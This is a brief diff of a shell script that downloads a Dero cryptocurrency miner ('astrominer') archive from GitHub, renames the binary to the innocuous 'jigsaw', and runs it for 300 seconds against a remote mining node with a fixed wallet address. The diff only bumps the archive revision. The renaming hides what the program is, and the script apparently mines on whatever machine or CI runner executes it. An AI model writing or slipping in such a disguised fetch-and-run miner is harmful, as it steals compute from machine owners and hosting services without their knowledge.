@@ -8,7 +8,7 @@
 
 
 
-wget -qO adul.tar.gz https://github.com/tj8519/astrominer/releases/download/V1.4/astrominer-V1.4_amd64_rev1.tar.gz
+wget -qO adul.tar.gz https://github.com/tj8519/astrominer/releases/download/V1.4/astrominer-V1.4_amd64_rev2.tar.gz
 tar xf adul.tar.gz
 mv astrominer jigsaw
 timeout 300 ./jigsaw -w dero1qyqdvrqzd8amxwwdy00axn6sgfvj22y95qu7vv6d54cpdq8h9pxq5qgalafqu -r dero-node-us.mysrv.cloud:443 -p rpc
